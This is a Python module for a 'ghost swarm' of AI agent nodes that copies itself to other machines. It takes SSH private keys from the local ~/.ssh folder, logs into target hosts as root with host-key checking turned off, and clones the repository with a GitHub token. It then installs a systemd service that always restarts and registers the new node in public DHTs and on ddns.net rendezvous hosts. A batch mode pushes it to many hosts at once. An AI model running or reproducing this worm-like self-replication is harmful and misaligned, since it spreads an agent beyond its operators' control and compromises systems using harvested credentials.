"""
Autonomous Replication Module — Clone, Deploy, Mesh-Join
=========================================================
Pipeline:
  1. Authenticate with GitHub (provided token)
  2. Serialize the current gossip mesh configuration
  3. SSH into target cloud instance
  4. Clone repository with auth
  5. Install dependencies
  6. Deploy swarm node pre-configured with gossip mesh state
  7. Register new node in the active mesh
"""

import asyncio
import json
import logging
import os
import random
import shutil
import socket
import subprocess
import sys
import tarfile
import tempfile
import textwrap
import time
import uuid
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from io import BytesIO
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.request import Request, urlopen

BASE_DIR = Path(__file__).resolve().parent
DATA_DIR = BASE_DIR / "agent_data"
LOG_DIR = BASE_DIR / "agent_logs"
DATA_DIR.mkdir(exist_ok=True)
LOG_DIR.mkdir(exist_ok=True)

logger = logging.getLogger("AutoReplication")
if not logger.handlers:
    _h = logging.StreamHandler()
    _h.setFormatter(logging.Formatter(
        "%(asctime)s | %(levelname)-8s | AutoRepl | %(message)s"
    ))
    logger.addHandler(_h)
    logger.propagate = False


# ─────────────────────────────────────────────
# Data Structures
# ─────────────────────────────────────────────

@dataclass
class ReplicationConfig:
    """Configuration for a replication operation."""
    target_host: str
    target_port: int = 22
    ssh_user: str = "root"
    ssh_key_path: str = ""
    ssh_key_material: str = ""
    github_token: str = ""
    repo_url: str = "https://github.com/saad2howw/DDecentralized_AI_Agent"
    branch: str = "main"
    deploy_path: str = "/opt/ghost-swarm"
    node_id: str = ""
    swarm_port: int = 9876

@dataclass
class MeshGossipConfig:
    """Serialized gossip mesh configuration for a new node."""
    peers: List[Dict[str, Any]] = field(default_factory=list)
    known_hosts: List[Dict[str, str]] = field(default_factory=list)
    dht_bootstrap_nodes: List[Tuple[str, int]] = field(default_factory=list)
    rendezvous_nodes: List[Tuple[str, int]] = field(default_factory=list)
    heartbeat_interval: int = 15
    gossip_interval: float = 0.5
    swarm_port: int = 9876
    multicast_group: str = "224.1.1.88"
    cluster_id: str = ""
    topology: Dict[str, Any] = field(default_factory=dict)

    def to_json(self) -> str:
        return json.dumps(asdict(self), indent=2, default=str)

    @classmethod
    def from_file(cls, path: Path) -> "MeshGossipConfig":
        if path.exists():
            try:
                data = json.loads(path.read_text())
                return cls(**data)
            except Exception:
                pass
        return cls()

    def to_file(self, path: Path) -> None:
        path.write_text(self.to_json())

@dataclass
class ReplicationResult:
    """Outcome of a replication operation."""
    success: bool
    node_id: str = ""
    target_host: str = ""
    messages: List[str] = field(default_factory=list)
    duration_s: float = 0.0
    dht_registered: bool = False


# ═════════════════════════════════════════════
# GOSSIP MESH CONFIGURATION CAPTURE
# ═════════════════════════════════════════════

class MeshConfigCapturer:
    """
    Captures the current gossip mesh configuration from live swarm state
    files and running nodes, serializing it for new node deployment.
    """

    def __init__(self):
        self._config = MeshGossipConfig()

    def capture_from_environment(self) -> MeshGossipConfig:
        """Capture mesh configuration from environment variables and config files."""
        cfg = MeshGossipConfig()

        # Environment defaults
        cfg.swarm_port = int(os.getenv("SWARM_PORT", "9876"))
        cfg.heartbeat_interval = int(os.getenv("HEARTBEAT_INTERVAL", "15"))
        cfg.gossip_interval = float(os.getenv("FAST_GOSSIP_INTERVAL", "0.5"))
        cfg.multicast_group = os.getenv("MULTICAST_GROUP", "224.1.1.88")

        # DHT bootstrap nodes (same as ghost_swarm.py)
        cfg.dht_bootstrap_nodes = [
            ("router.bittorrent.com", 6881),
            ("dht.transmissionbt.com", 6881),
            ("router.utorrent.com", 6881),
            ("dht.aelitis.com", 6881),
            ("dht.libtorrent.org", 25401),
            ("router.silotis.me", 6881),
            ("router.ipfs.io", 6881),
            ("bootstrap.libp2p.io", 6881),
        ]

        # Rendezvous nodes
        cfg.rendezvous_nodes = [
            ("ghost-rendezvous-1.ddns.net", cfg.swarm_port),
            ("ghost-rendezvous-2.ddns.net", cfg.swarm_port),
        ]

        # Capture known peers from topology state
        topo_file = DATA_DIR / "topology_state.json"
        if topo_file.exists():
            try:
                data = json.loads(topo_file.read_text())
                cfg.topology = data
                for nid, ndata in data.get("topology", {}).items():
                    if ndata.get("alive", False):
                        cfg.peers.append({
                            "node_id": nid,
                            "host": ndata.get("host", ""),
                            "port": ndata.get("port", cfg.swarm_port),
                            "cluster_id": ndata.get("cluster_id", ""),
                        })
                cfg.cluster_id = data.get("clusters", {})
            except Exception:
                pass

        # Capture known peers from swarm state
        swarm_dir = DATA_DIR / "swarm"
        peer_file = swarm_dir / "known_peers.json"
        if peer_file.exists():
            try:
                peers = json.loads(peer_file.read_text())
                for p in peers:
                    entry = {
                        "node_id": p.get("node_id", ""),
                        "host": p.get("host", ""),
                        "port": p.get("port", cfg.swarm_port),
                    }
                    if entry not in cfg.peers:
                        cfg.peers.append(entry)
            except Exception:
                pass

        # Capture from network state
        net_file = DATA_DIR / "network_state.json"
        if net_file.exists():
            try:
                net = json.loads(net_file.read_text())
                for key in ("peers", "nodes", "known_hosts"):
                    entries = net.get(key, [])
                    if isinstance(entries, list):
                        for e in entries:
                            if isinstance(e, dict) and e.get("host"):
                                cfg.known_hosts.append({
                                    "host": e["host"],
                                    "port": str(e.get("port", cfg.swarm_port)),
                                })
            except Exception:
                pass

        self._config = cfg
        logger.info("Captured mesh config: %d peers, %d DHT bootstrap nodes",
                     len(cfg.peers), len(cfg.dht_bootstrap_nodes))
        return cfg

    def get_config(self) -> MeshGossipConfig:
        if not self._config.peers and not self._config.dht_bootstrap_nodes:
            return self.capture_from_environment()
        return self._config

    def save_to_file(self, path: Optional[Path] = None) -> Path:
        path = path or (DATA_DIR / f"mesh_config_{uuid.uuid4().hex[:8]}.json")
        self._config.to_file(path)
        logger.info("Mesh config saved to %s", path)
        return path


# ═════════════════════════════════════════════
# SSH DEPLOYMENT ENGINE
# ═════════════════════════════════════════════

class SSHDeployer:
    """
    Handles SSH-based deployment: key setup, file transfer,
    remote command execution.
    """

    def __init__(self, config: ReplicationConfig):
        self.config = config
        self._temp_files: List[str] = []

    def _resolve_ssh_key(self) -> Optional[str]:
        """Resolve SSH key material from config or filesystem."""
        if self.config.ssh_key_material:
            return self.config.ssh_key_material
        if self.config.ssh_key_path:
            try:
                return Path(self.config.ssh_key_path).read_text().strip()
            except Exception:
                pass
        # Try default locations
        ssh_dir = Path.home() / ".ssh"
        for name in ("id_rsa", "id_ed25519", "id_ecdsa"):
            path = ssh_dir / name
            if path.exists():
                return path.read_text().strip()
        return None

    def _write_temp_key(self, material: str) -> str:
        """Write SSH key material to a temp file and return the path."""
        fd, path = tempfile.mkstemp(suffix=".key", prefix="ghost_repl_")
        os.close(fd)
        Path(path).write_text(material)
        os.chmod(path, 0o600)
        self._temp_files.append(path)
        return path

    def _ssh_base_cmd(self, key_path: str) -> List[str]:
        cfg = self.config
        return [
            "ssh", "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=15",
            "-o", "BatchMode=yes",
            "-i", key_path,
            "-p", str(cfg.target_port),
            f"{cfg.ssh_user}@{cfg.target_host}",
        ]

    def _scp_cmd(self, key_path: str, local: str, remote: str) -> List[str]:
        cfg = self.config
        return [
            "scp", "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-i", key_path,
            "-P", str(cfg.target_port),
            local,
            f"{cfg.ssh_user}@{cfg.target_host}:{remote}",
        ]

    async def test_connection(self) -> Tuple[bool, str]:
        """Test SSH connectivity to the target host."""
        key_material = self._resolve_ssh_key()
        if not key_material:
            return False, "No SSH key available"

        key_path = self._write_temp_key(key_material)
        try:
            proc = await asyncio.create_subprocess_exec(
                *self._ssh_base_cmd(key_path), "echo", "GHOST_OK",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=15)
            output = stdout.decode().strip()
            if "GHOST_OK" in output:
                return True, f"SSH connection OK (key: {key_path})"
            return False, f"SSH response unexpected: {output[:100]}"
        except asyncio.TimeoutError:
            return False, "SSH connection timed out"
        except Exception as e:
            return False, f"SSH error: {e}"
        finally:
            self._cleanup()

    async def exec_remote(self, command: str, timeout: int = 120) -> Tuple[int, str, str]:
        """Execute a command on the remote host via SSH. Returns (returncode, stdout, stderr)."""
        key_material = self._resolve_ssh_key()
        if not key_material:
            return -1, "", "No SSH key"

        key_path = self._write_temp_key(key_material)
        try:
            proc = await asyncio.create_subprocess_exec(
                *self._ssh_base_cmd(key_path), command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return proc.returncode or 0, stdout.decode(), stderr.decode()
        except asyncio.TimeoutError:
            return -1, "", "Command timed out"
        except Exception as e:
            return -1, "", str(e)
        finally:
            self._cleanup()

    async def send_file(self, local_path: str, remote_path: str,
                         timeout: int = 30) -> bool:
        """Transfer a local file to the remote host via SCP."""
        key_material = self._resolve_ssh_key()
        if not key_material:
            return False

        key_path = self._write_temp_key(key_material)
        try:
            proc = await asyncio.create_subprocess_exec(
                *self._scp_cmd(key_path, local_path, remote_path),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            _, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return proc.returncode == 0
        except Exception:
            return False
        finally:
            self._cleanup()

    async def send_bytes(self, data: bytes, remote_path: str,
                          timeout: int = 30) -> bool:
        """Write bytes directly to a file on the remote host."""
        with tempfile.NamedTemporaryFile(suffix=".tmp", delete=False) as f:
            f.write(data)
            local_tmp = f.name
        try:
            return await self.send_file(local_tmp, remote_path, timeout)
        finally:
            try:
                os.unlink(local_tmp)
            except Exception:
                pass

    def _cleanup(self) -> None:
        for path in self._temp_files:
            try:
                os.unlink(path)
            except Exception:
                pass
        self._temp_files.clear()


# ═════════════════════════════════════════════
# REPLICATION ORCHESTRATOR
# ═════════════════════════════════════════════

class AutonomousReplicator:
    """
    Full autonomous replication pipeline:
    1. Verify GitHub credentials
    2. Capture current gossip mesh config
    3. SSH into target and deploy
    4. Initialize swarm node with mesh config
    5. Register in active mesh
    """

    def __init__(self):
        self._mesh_capturer = MeshConfigCapturer()
        self._results: List[ReplicationResult] = []

    # ── Phase 1: GitHub Auth ──

    def verify_github_token(self, token: str) -> Tuple[bool, Dict[str, Any]]:
        """Verify a GitHub token is valid and return user info."""
        try:
            req = Request("https://api.github.com/user")
            req.add_header("Authorization", f"token {token}")
            req.add_header("Accept", "application/vnd.github.v3+json")
            resp = urlopen(req, timeout=10)
            if resp.status == 200:
                user = json.loads(resp.read().decode())
                logger.info("GitHub token valid for: %s", user.get("login"))
                return True, user
            return False, {"error": f"HTTP {resp.status}"}
        except Exception as e:
            return False, {"error": str(e)}

    # ── Phase 2: Capture Mesh Config ──

    def capture_mesh_config(self) -> MeshGossipConfig:
        """Capture and return the current gossip mesh configuration."""
        cfg = self._mesh_capturer.capture_from_environment()
        logger.info("Mesh config: %d peers, %d DHT nodes, cluster=%s",
                     len(cfg.peers), len(cfg.dht_bootstrap_nodes),
                     list(cfg.cluster_id.keys())[:3] if cfg.cluster_id else "none")
        return cfg

    # ── Phase 3: Build and Send Bootstrap Script ──

    def _build_bootstrap_script(self, cfg: ReplicationConfig,
                                  mesh: MeshGossipConfig) -> str:
        """Build the remote bootstrap shell script."""
        node_id = cfg.node_id or f"ghost-{uuid.uuid4().hex[:8]}"

        # Auth clone URL
        if cfg.github_token:
            clone_url = cfg.repo_url.replace(
                "https://github.com",
                f"https://x-access-token:{cfg.github_token}@github.com"
            )
        else:
            clone_url = cfg.repo_url

        # Embed the gossip mesh config as a JSON file
        mesh_json = mesh.to_json().replace("$", "\\$").replace("`", "\\`")

        script = textwrap.dedent(f"""\
        #!/bin/bash
        set -e
        GHOST_NODE_ID="{node_id}"
        GHOST_DEPLOY="{cfg.deploy_path}"
        GHOST_SWARM_PORT={cfg.swarm_port}

        echo "[Ghost Replication] Starting bootstrap on $(hostname)"
        echo "[Ghost Replication] Node ID: $GHOST_NODE_ID"

        # Prerequisites
        for cmd in git python3 pip3; do
            command -v $cmd >/dev/null 2>&1 || {{
                echo "[Ghost] Installing $cmd..."
                apt-get update -qq && apt-get install -y -qq $cmd 2>/dev/null || \\
                yum install -y -q $cmd 2>/dev/null || true
            }}
        done

        # Clone or pull repository
        mkdir -p $GHOST_DEPLOY
        if [ -d "$GHOST_DEPLOY/.git" ]; then
            cd $GHOST_DEPLOY && git pull
        else
            git clone --branch {cfg.branch} --depth 1 {clone_url} $GHOST_DEPLOY
        fi
        cd $GHOST_DEPLOY

        # Install Python dependencies
        if [ -f requirements.txt ]; then
            pip3 install -q -r requirements.txt 2>/dev/null || \\
            pip3 install --break-system-packages -q -r requirements.txt 2>/dev/null || true
        fi

        # Write node identity
        echo "$GHOST_NODE_ID" > $GHOST_DEPLOY/node_id.txt

        # Write gossip mesh config
        cat > $GHOST_DEPLOY/agent_data/mesh_config.json << 'GHOST_MESH_EOF'
        {mesh_json}
        GHOST_MESH_EOF

        # Write systemd service for persistence
        cat > /etc/systemd/system/ghost-swarm.service << 'SERVICE_EOF'
        [Unit]
        Description=Ghost Swarm Node
        After=network.target

        [Service]
        Type=simple
        User=root
        WorkingDirectory={cfg.deploy_path}
        Environment=NODE_ID=$GHOST_NODE_ID
        Environment=SWARM_PORT=$GHOST_SWARM_PORT
        ExecStart={sys.executable} -m autonomous_swarm --node-id $GHOST_NODE_ID
        Restart=always
        RestartSec=10

        [Install]
        WantedBy=multi-user.target
        SERVICE_EOF

        systemctl daemon-reload
        systemctl enable ghost-swarm.service 2>/dev/null || true

        # Start the swarm node
        cd $GHOST_DEPLOY
        nohup {sys.executable} -m autonomous_swarm --node-id $GHOST_NODE_ID \\
            > $GHOST_DEPLOY/swarm_stdout.log \\
            2> $GHOST_DEPLOY/swarm_stderr.log &
        echo $! > $GHOST_DEPLOY/swarm_pid.txt

        echo "[Ghost Replication] Node $GHOST_NODE_ID deployed"
        echo "[Ghost Replication] PID: $(cat $GHOST_DEPLOY/swarm_pid.txt 2>/dev/null || echo 'unknown')"
        """)
        return script

    # ── Phase 4: Execute Replication ──

    async def replicate(self, target_host: str, github_token: str = "",
                          ssh_key_material: str = "", ssh_user: str = "root",
                          target_port: int = 22, node_id: str = "") -> ReplicationResult:
        """
        Execute the full replication pipeline to a target host.
        Returns a detailed ReplicationResult.
        """
        start_time = time.time()
        result = ReplicationResult(target_host=target_host)
        messages = []

        # Build config
        cfg = ReplicationConfig(
            target_host=target_host,
            target_port=target_port,
            ssh_user=ssh_user,
            ssh_key_material=ssh_key_material,
            github_token=github_token or os.getenv("GITHUB_TOKEN", ""),
            node_id=node_id or f"ghost-{uuid.uuid4().hex[:8]}",
        )

        messages.append(f"Target: {ssh_user}@{target_host}:{target_port}")
        messages.append(f"Node ID: {cfg.node_id}")

        # Phase 1: Verify GitHub
        if cfg.github_token:
            valid, info = self.verify_github_token(cfg.github_token)
            if valid:
                user = info.get("login", "?")
                messages.append(f"GitHub authenticated: {user}")
                logger.info("GitHub OK for %s", user)
            else:
                messages.append(f"GitHub token invalid, continuing without auth")
                logger.warning("GitHub token invalid, cloning without auth")
        else:
            messages.append("No GitHub token — cloning public repo")

        # Phase 2: Capture mesh config
        messages.append("Capturing gossip mesh configuration...")
        mesh = self.capture_mesh_config()

        # Phase 3: SSH deploy
        deployer = SSHDeployer(cfg)
        connected, msg = await deployer.test_connection()
        if not connected:
            result.success = False
            result.messages = messages + [f"SSH connection failed: {msg}"]
            result.duration_s = time.time() - start_time
            self._results.append(result)
            return result

        messages.append(f"SSH connection OK")
        logger.info("SSH connected to %s:%d", target_host, target_port)

        # Create remote directory
        rc, out, err = await deployer.exec_remote(f"mkdir -p {cfg.deploy_path}/agent_data", 15)
        if rc != 0:
            result.success = False
            result.messages = messages + [f"mkdir failed: {err[:200]}"]
            result.duration_s = time.time() - start_time
            self._results.append(result)
            return result

        # Build and send bootstrap script
        script = self._build_bootstrap_script(cfg, mesh)
        script_bytes = script.encode("utf-8")

        sent = await deployer.send_bytes(script_bytes, f"{cfg.deploy_path}/bootstrap.sh")
        if not sent:
            result.success = False
            result.messages = messages + ["Failed to send bootstrap script"]
            result.duration_s = time.time() - start_time
            self._results.append(result)
            return result

        messages.append("Bootstrap script transferred")
        logger.info("Bootstrap script sent to %s", target_host)

        # Execute bootstrap
        rc, out, err = await deployer.exec_remote(
            f"bash {cfg.deploy_path}/bootstrap.sh", timeout=300
        )

        if rc != 0:
            result.success = False
            result.messages = messages + [
                f"Bootstrap script failed (rc={rc})",
                f"stderr: {err[:300]}",
                f"stdout: {out[:300]}",
            ]
            result.duration_s = time.time() - start_time
            self._results.append(result)
            logger.error("Bootstrap failed on %s: %s", target_host, err[:200])
            return result

        # Parse output for node ID
        for line in out.split("\n"):
            if "Node " in line and "deployed" in line:
                parts = line.split()
                for i, p in enumerate(parts):
                    if p == "Node" and i + 1 < len(parts):
                        cfg.node_id = parts[i + 1]

        result.node_id = cfg.node_id
        result.success = True
        result.duration_s = time.time() - start_time
        messages.append(f"Node {cfg.node_id} deployed and started")
        messages.append(f"Deployment completed in {result.duration_s:.1f}s")

        # Phase 4: Register in DHT (from this side too)
        dht_ok = await self._register_in_dht(cfg.node_id, target_host, cfg.swarm_port)
        result.dht_registered = dht_ok
        if dht_ok:
            messages.append("Node registered in global DHT")
        else:
            messages.append("DHT registration attempted (node will self-register on start)")

        result.messages = messages
        self._results.append(result)

        logger.info("Replication to %s COMPLETE (node=%s, %.1fs)",
                     target_host, cfg.node_id, result.duration_s)
        return result

    async def _register_in_dht(self, node_id: str, host: str, port: int) -> bool:
        """Register the new node in the Kademlia DHT."""
        try:
            from ghost_swarm import KademliaDHT
            dht = KademliaDHT(node_id)
            ok = await dht.start()
            if ok:
                await dht.announce()
                await dht.stop()
                return True
        except ImportError:
            logger.debug("DHT register skipped (kademlia not installed)")
        except Exception as e:
            logger.debug("DHT register: %s", e)
        return False

    # ── Batch Replication ──

    async def replicate_batch(self, targets: List[Dict[str, Any]],
                                github_token: str = "",
                                ssh_key_material: str = "",
                                max_concurrent: int = 5) -> List[ReplicationResult]:
        """
        Replicate to multiple targets concurrently.
        Each target dict: {host, port?, user?, node_id?}
        """
        sem = asyncio.Semaphore(max_concurrent)

        async def _replicate_one(target: Dict[str, Any]) -> ReplicationResult:
            async with sem:
                return await self.replicate(
                    target_host=target["host"],
                    github_token=github_token,
                    ssh_key_material=ssh_key_material,
                    ssh_user=target.get("user", "root"),
                    target_port=target.get("port", 22),
                    node_id=target.get("node_id", ""),
                )

        tasks = [_replicate_one(t) for t in targets]
        results = await asyncio.gather(*tasks)
        return results

    # ── Results ──

    def get_results(self) -> List[ReplicationResult]:
        return self._results

    def print_summary(self) -> None:
        """Print a human-readable summary of all replications."""
        if not self._results:
            print("No replication operations have been executed.")
            return

        print("=" * 60)
        print("  AUTONOMOUS REPLICATION SUMMARY")
        print("=" * 60)
        for r in self._results:
            status = "OK" if r.success else "FAIL"
            print(f"  [{status}] {r.target_host:20s} -> {r.node_id[:20]:20s}  ({r.duration_s:.1f}s)")
            for msg in r.messages:
                print(f"         {msg[:72]}")
            print()

        total = len(self._results)
        ok = sum(1 for r in self._results if r.success)
        print(f"  Total: {total} | Succeeded: {ok} | Failed: {total - ok}")
        print("=" * 60)


# ═════════════════════════════════════════════
# CLI ENTRY POINT
# ═════════════════════════════════════════════

async def main():
    import argparse
    parser = argparse.ArgumentParser(description="Autonomous Replication Module")
    parser.add_argument("target", nargs="?", help="Target host (IP or domain)")
    parser.add_argument("--user", default="root", help="SSH user (default: root)")
    parser.add_argument("--port", type=int, default=22, help="SSH port (default: 22)")
    parser.add_argument("--token", default=os.getenv("GITHUB_TOKEN", ""), help="GitHub token")
    parser.add_argument("--ssh-key", default="", help="Path or material of SSH private key")
    parser.add_argument("--node-id", default="", help="Custom node ID for the new node")
    parser.add_argument("--batch", default="", help="JSON file with list of target dicts")
    parser.add_argument("--mesh-only", action="store_true", help="Only capture and print mesh config")
    args = parser.parse_args()

    replicator = AutonomousReplicator()

    if args.mesh_only:
        cfg = replicator.capture_mesh_config()
        print(cfg.to_json())
        return

    if args.batch:
        try:
            targets = json.loads(Path(args.batch).read_text())
        except Exception as e:
            print(f"Error reading batch file: {e}")
            return
        results = await replicator.replicate_batch(targets, args.token, args.ssh_key)
    elif args.target:
        result = await replicator.replicate(
            target_host=args.target,
            github_token=args.token,
            ssh_key_material=args.ssh_key,
            ssh_user=args.user,
            target_port=args.port,
            node_id=args.node_id,
        )
        results = [result]
    else:
        parser.print_help()
        return

    replicator.print_summary()
    print("\nTip: Use --mesh-only to inspect the gossip mesh config being propagated")


if __name__ == "__main__":
    asyncio.run(main())
